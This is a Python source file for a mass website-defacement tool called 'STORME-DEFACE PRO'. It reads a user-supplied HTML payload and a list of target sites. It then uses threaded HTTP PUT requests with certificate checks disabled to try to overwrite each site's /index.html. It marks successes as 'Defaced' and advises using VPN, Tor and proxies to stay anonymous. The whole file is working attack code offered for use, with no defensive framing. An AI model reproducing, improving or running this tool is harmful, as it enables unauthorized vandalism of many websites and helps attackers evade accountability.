# -*- coding: utf-8 -*-
# STORME-DEFACE PRO | @18shinstorme | KEY: stormeshin18

import os
import sys
import time
import random
import threading
import requests
from storme_colors import *
from storme_utils import validate_target, generate_user_agent
from storme_logger import log_attack

# Configurações
MAX_THREADS = 10  # Limite de threads para evitar bloqueios
TIMEOUT = 10      # Timeout para requests (segundos)

banner = f"""
{random_color()}
             ___
           /  >  フ   
          /   _  _|    {bold}Author: @18shinstorme{reset}
        /`   ミ_x/      {bold}Version: STORME-DEFACE PRO{reset}
     _//        |       {bold}Key: stormeshin18{reset}
    /  ヽ       ﾉ       {bold}Date: {time.strftime("%Y-%m-%d")}{reset}
    │     | | |
  ／￣\   | | |  
  | (￣ヽ＿ヽ)_)
   ＼二つ
{reset}
"""

def animate():
    animations = ["⚡", "🔥", "💀", "🖤"]
    while True:
        for anim in animations:
            sys.stdout.write(f"\r{red}{bold}[{anim}] Attacking... {random.choice(['Bypassing security...', 'Injecting payload...', 'Overwriting files...'])}{reset}")
            sys.stdout.flush()
            time.sleep(0.3)

def storme_input(prompt):
    try:
        return input(prompt) if sys.version_info.major > 2 else raw_input(prompt)
    except KeyboardInterrupt:
        print(f"\n{red}{bold}[!] Operation canceled by user.{reset}")
        sys.exit(1)

def deface_attack(script_path, target_file="targets.txt"):
    try:
        if not os.path.isfile(script_path):
            raise FileNotFoundError(f"Script file '{script_path}' not found!")
        
        if not os.path.isfile(target_file):
            raise FileNotFoundError(f"Target file '{target_file}' not found!")

        with open(script_path, "r", encoding="utf-8") as f:
            payload = f.read()

        with open(target_file, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

        if not targets:
            raise ValueError("No valid targets found in targets.txt!")

        session = requests.Session()
        session.headers.update({"User-Agent": generate_user_agent()})

        print(f"\n{yellow}{bold}[!] Starting attack on {len(targets)} targets...{reset}\n")

        # Thread de animação
        anim_thread = threading.Thread(target=animate)
        anim_thread.daemon = True
        anim_thread.start()

        # Semáforo para limitar threads
        thread_limiter = threading.BoundedSemaphore(MAX_THREADS)

        def attack_thread(site):
            try:
                with thread_limiter:
                    site = validate_target(site)
                    try:
                        req = session.put(
                            site + "/index.html", 
                            data=payload,
                            timeout=TIMEOUT,
                            verify=False  # Ignora SSL (para evitar erros em certos sites)
                        )
                        if 200 <= req.status_code < 300:
                            msg = f"[SUCCESS] Defaced -> {site}"
                            print(f"{green}{bold}{msg}{reset}")
                            log_attack(site, "SUCCESS")
                        else:
                            msg = f"[FAILED] Code {req.status_code} -> {site}"
                            print(f"{red}{msg}{reset}")
                            log_attack(site, f"FAILED (HTTP {req.status_code})")
                    except Exception as e:
                        msg = f"[ERROR] {str(e)} -> {site}"
                        print(f"{purple}{msg}{reset}")
                        log_attack(site, f"ERROR ({str(e)})")
            except Exception as e:
                print(f"{red}{bold}[CRITICAL] Thread error: {str(e)}{reset}")

        # Inicia threads de ataque
        threads = []
        for site in targets:
            t = threading.Thread(target=attack_thread, args=(site,))
            t.daemon = True
            threads.append(t)
            t.start()

        # Aguarda todas as threads
        for t in threads:
            t.join()

    except Exception as e:
        print(f"{red}{bold}[FATAL ERROR] {str(e)}{reset}")
        log_attack("SYSTEM", f"CRASH: {str(e)}")
    finally:
        print(f"\n{blue}{bold}[*] Attack completed. Check 'storme.log' for details.{reset}")

def main():
    try:
        print(banner)
        print(f"{yellow}{bold}[!] WARNING: Use VPN + TOR + Proxies for anonymity!{reset}\n")

        while True:
            script = storme_input(f"{red}⚡ STORME-DEFACE{reset} {cyan}Enter script path (e.g., 'index.html'): {reset}")
            if os.path.isfile(script):
                break
            print(f"{red}[!] File not found. Try again.{reset}")

        deface_attack(script)
    except KeyboardInterrupt:
        print(f"\n{red}{bold}[!] Operation canceled by user.{reset}")
    except Exception as e:
        print(f"{red}{bold}[!] Critical error: {str(e)}{reset}")

if __name__ == "__main__":
    main()